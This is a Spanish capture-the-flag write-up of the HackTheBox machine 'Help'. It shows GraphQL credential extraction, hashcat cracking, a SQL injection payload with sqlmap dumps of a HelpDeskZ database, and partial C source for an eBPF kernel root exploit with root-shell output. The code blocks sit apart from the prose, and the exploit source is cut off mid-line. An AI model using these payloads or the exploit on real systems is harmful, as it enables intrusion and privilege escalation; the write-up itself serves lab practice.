# Help

![](../../../../~gitbook/image.md)Publicado: 06 de Mayo de 2025
Autor: José Miguel Romero aka x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Help" es una máquina Linux de dificultad fácil en HackTheBox que presenta una aplicación web vulnerable de mesa de ayuda (HelpDeskZ) y una API GraphQL. La explotación implica múltiples vectores: enumeración web, extracción de credenciales a través de GraphQL, explotación de SQLi en la aplicación web para obtener más credenciales, y finalmente una escalada de privilegios aprovechando una vulnerabilidad en el kernel de Linux.La máquina es particularmente útil para practicar técnicas de reconocimiento web, manipulación de APIs GraphQL, explotación de SQL Injection y escalada de privilegios mediante vulnerabilidades de kernel.
### 🚀 Metodología

### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios
⚠️ Importante: El servicio HTTP redirige a `help.htb`. Debemos agregar este dominio a nuestro archivo hosts.
### 🌐 Enumeración Web
El servicio HTTP del puerto 80 muestra un sitio web con apache en construcción sin nada interesante:![](../../../../~gitbook/image.md)
#### Fuzzing de vhosts
No encontramos nada relevante.
#### Fuzzing de directorios
Realizando fuzzing de directorios descubrimos un directorio llamado /support![](../../../../~gitbook/image.md)El sitio web está usando un servicio llamado HelpDeskZ aunque no sabemos a priori la versión.Haciendo una búsqueda sobre el proyecto en github encontramos que en el directorio raíz hay un fichero llamado UPGRADING.txthttps://github.com/ViktorNova/HelpDeskZ/blob/master/UPGRADING.txtEste fichero parece indicar entre cosas la versión. Veamos si podemos enumerar la versión en nuestro caso:http://help.htb/support/UPGRADING.txt![](../../../../~gitbook/image.md)Verificamos que es la versión 1.0.2 y esta versión es vulnerable a Arbitrary File Upload y a authenticated sql injection:https://www.exploit-db.com/exploits/40300![](../../../../~gitbook/image.md)https://www.exploit-db.com/exploits/41200![](../../../../~gitbook/image.md)Encontramos una sección que permite enviar tickets rellenando una serie de campos del formulario y además hay un módulo de subida de archivos. Creo que puede valer la pena analizar esté módulo para ver qué extensiones permite. Intentamos subir un archivo .php:Al acceder al puerto 3000 encontramos que el servicio nos devuelve un JSON indicando el siguiente mensaje:![](../../../../~gitbook/image.md)En la pestaña "Headers" vemos que en la respuesta está especificando que se está empleando Express.![](../../../../~gitbook/image.md)Googleando sobre «Express js query language» nos encontramos con resultados relacionados con GraphQL.Al navegar al recurso /graphql nos indica que falta por especificar un parámetro de tipo GET en la solicitud:![](../../../../~gitbook/image.md)A continuación intentamos consultar información. Un endpoint graphql toma objetos como entrada. Como necesitamos información relacionada con un usuario vamos a probar con un objeto usuario. Usamos jq para formatear la salida a JSON![](../../../../~gitbook/image.md)La respuesta nos indica que parece que la petición espera que se especifiquen subcampos. Probamos por ejemplo con el campo username o usernames:![](../../../../~gitbook/image.md)Encontramos un usuario, ahora podemos ir más allá e intentar también obtener el campo contraseña a ver si existe:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Parece que el campo contraseña es un hash MD5. Usamos hashcat para intentar crackearlo:![](../../../../~gitbook/image.md)Probamos estas credenciales en el panel de login anterior y logramos acceder:![](../../../../~gitbook/image.md)Anteriormente cuando enumeramos la versión de este software vimos que podía ser vulnerable a Arbitrary File Upload y Authenticated SQLi.![](../../../../~gitbook/image.md)El exploit no me funcionó con esta máquina, pero tras revisar el contenido pude entender lo que hacía para intentar realizar la explotación de forma manual.Lo primero que se requiere es crear un ticket adjuntando un archivo:![](../../../../~gitbook/image.md)A continuación, copiamos la url del adjunto en el navegador e interceptamos la petición con burp:Probamos añadiendo una inyección muy sencilla y confirmamos la vulnerabilidad:![](../../../../~gitbook/image.md)Enviando esto resulta en una condición verdadera que devuelve la imagen pero cambiándolo a 1=2 no lo hace porque se evalúa a falso. Esto confirma la vulnerabilidad SQLi.Podemos automatizar la inyección con sqlmap:Hay bastantes tablas por lo que una vez localizamos la que nos interesa lanzamos de nuevo sqlmap indicando la misma para hacer un dump:![](../../../../~gitbook/image.md)Obtenemos la contraseña de la cuenta Administrator: Welcome1Estas credenciales no funcionarion en el panel de /support de helpdesz. Tampoco funcionaron de primeras con ssh las combinaciones Administrator, admin, helpme, root, hasta que probé con help como usuario y pude autenticarme vía ssh:![](../../../../~gitbook/image.md)
#### Escalando privilegios
Verificamos que el usuario help no puede ejecutar ningún comando como root:Al enumerar la versión del kernel parece que es una versión vulnerable:![](../../../../~gitbook/image.md)
https://www.exploit-db.com/exploits/44298![](../../../../~gitbook/image.md)Creamos un fichero en el directorio /tmp de la máquina objetivo con el nombre exploit.c y el contenido del exploitA continuación lo compilamosLe damos permisos de ejecución y lo lanzamos:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🚀 Metodología](#metodologia)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯ ping -c2 10.10.10.121
PING 10.10.10.121 (10.10.10.121) 56(84) bytes of data.
64 bytes from 10.10.10.121: icmp_seq=1 ttl=63 time=48.7 ms
64 bytes from 10.10.10.121: icmp_seq=2 ttl=63 time=46.7 ms

--- 10.10.10.121 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 46.736/47.707/48.679/0.971 ms
```

```

ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.121 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80,3000
```

```
❯ nmap -sC -sV -p$ports 10.10.10.121 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 18:59 CEST
Nmap scan report for 10.10.10.121
Host is up (0.046s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo "10.10.10.121 help.htb" | sudo tee -a /etc/hosts
```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://help.htb -H 'Host:FUZZ.help.htb' -fc 302
```

```
feroxbuster -u http://help.htb -r  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --scan-dir-listings -C 403,404
```

```
|message|"Hi Shiv, To get access please find the credentials with given query"|
```

```
curl -s -G http://10.10.10.121:3000/graphql --data-urlencode "query={user}" | jq
```

```
curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username} }' | jq
```

```
curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username, password} }' |
jq
```

```
hashcat -m 0 hash_helpme /usr/share/wordlists/rockyou.txt
```

```
searchsploit -m php/webapps/41200.py
```

```
http://help.htb/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=7
```

```
and 1=1-- -
```

```
sqlmap -r req  -p param[] --level 5 --risk 3 --threads 10 --dump --batch
```

```
sqlmap -r req -D support -T staff --threads 10 --dump --batch
```

```
ssh help@10.10.10.121
```

```
help@help:/home$ cd help
help@help:~$ ls
help  npm-debug.log  user.txt
help@help:~$ cat user.txt
172100*********53c987d******938
help@help:~$
```

```
help@help:~$ sudo -l
[sudo] password for help:
Sorry, user help may not run sudo on help.
```

```
/*
* Ubuntu 16.04.4 kernel priv esc
*
* all credits to @bleidl
* - vnik
*/

// Tested on:
// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
// if different kernel adjust CRED offset + check kernel stack size
# include
# include
# include
# include
# include
# include
# include
# include
# include
# include
# include
# include
# include
# include

# define PHYS_OFFSET 0xffff880000000000
# define CRED_OFFSET 0x5f8
# define UID_OFFSET 4
# define LOG_BUF_SIZE 65536
# define PROGSIZE 328

int sockets[2];
int mapfd, progfd;

char *__prog = 	"\xb4\x09\x00\x00\xff\xff\xff\xff"
"\x55\x09\x02\x00\xff\xff\xff\xff"
"\xb7\x00\x00\x00\x00\x00\x00\x00"
"\x95\x00\x00\x00\x00\x00\x00\x00"
"\x18\x19\x00\x00\x03\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\xbf\x91\x00\x00\x00\x00\x00\x00"
"\xbf\xa2\x00\x00\x00\x00\x00\x00"
"\x07\x02\x00\x00\xfc\xff\xff\xff"
"\x62\x0a\xfc\xff\x00\x00\x00\x00"
"\x85\x00\x00\x00\x01\x00\x00\x00"
"\x55\x00\x01\x00\x00\x00\x00\x00"
"\x95\x00\x00\x00\x00\x00\x00\x00"
"\x79\x06\x00\x00\x00\x00\x00\x00"
"\xbf\x91\x00\x00\x00\x00\x00\x00"
"\xbf\xa2\x00\x00\x00\x00\x00\x00"
"\x07\x02\x00\x00\xfc\xff\xff\xff"
"\x62\x0a\xfc\xff\x01\x00\x00\x00"
"\x85\x00\x00\x00\x01\x00\x00\x00"
"\x55\x00\x01\x00\x00\x00\x00\x00"
"\x95\x00\x00\x00\x00\x00\x00\x00"
"\x79\x07\x00\x00\x00\x00\x00\x00"
"\xbf\x91\x00\x00\x00\x00\x00\x00"
"\xbf\xa2\x00\x00\x00\x00\x00\x00"
"\x07\x02\x00\x00\xfc\xff\xff\xff"
"\x62\x0a\xfc\xff\x02\x00\x00\x00"
"\x85\x00\x00\x00\x01\x00\x00\x00"
"\x55\x00\x01\x00\x00\x00\x00\x00"
"\x95\x00\x00\x00\x00\x00\x00\x00"
"\x79\x08\x00\x00\x00\x00\x00\x00"
"\xbf\x02\x00\x00\x00\x00\x00\x00"
"\xb7\x00\x00\x00\x00\x00\x00\x00"
"\x55\x06\x03\x00\x00\x00\x00\x00"
"\x79\x73\x00\x00\x00\x00\x00\x00"
"\x7b\x32\x00\x00\x00\x00\x00\x00"
"\x95\x00\x00\x00\x00\x00\x00\x00"
"\x55\x06\x02\x00\x01\x00\x00\x00"
"\x7b\xa2\x00\x00\x00\x00\x00\x00"
"\x95\x00\x00\x00\x00\x00\x00\x00"
"\x7b\x87\x00\x00\x00\x00\x00\x00"
"\x95\x00\x00\x00\x00\x00\x00\x00";

char bpf_log_buf[LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
const struct bpf_insn *insns, int prog_len,
const char *license, int kern_version) {
union bpf_attr attr = {
.prog_type = prog_type,
.insns = (__u64)insns,
.insn_cnt = prog_len / sizeof(struct bpf_insn),
.license = (__u64)license,
.log_buf = (__u64)bpf_log_buf,
.log_size = LOG_BUF_SIZE,
.log_level = 1,
};

attr.kern_version = kern_version;

bpf_log_buf[0] = 0;

return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
int max_entries) {
union bpf_attr attr = {
.map_type = map_type,
.key_size = key_size,
.value_size = value_size,
.max_entries = max_entries
};

return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) {
union bpf_attr attr = {
.map_fd = mapfd,
.key = (__u64)&key,
.value = (__u64)&value,
.flags = 0,
};

return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) {
union bpf_attr attr = {
.map_fd = mapfd,
.key = (__u64)key,
.value = (__u64)value,
};

return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static void __exit(char *err) {
fprintf(stderr, "error: %s\n", err);
exit(-1);
}

static void prep(void) {
mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
if (mapfd
```
gcc exploit.c -o exploit
```

```
chmod +x
```

```
help@help:/tmp$ ./exploit
task_struct = ffff88001c944600
uidptr = ffff880019cae6c4
spawning root shell
root@help:/tmp# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
root@help:/tmp#
```

```
root@help:/root# ls
root.txt  snap
root@help:/root# cat root.txt
63361f0**************a67b6
root@help:/root#
```
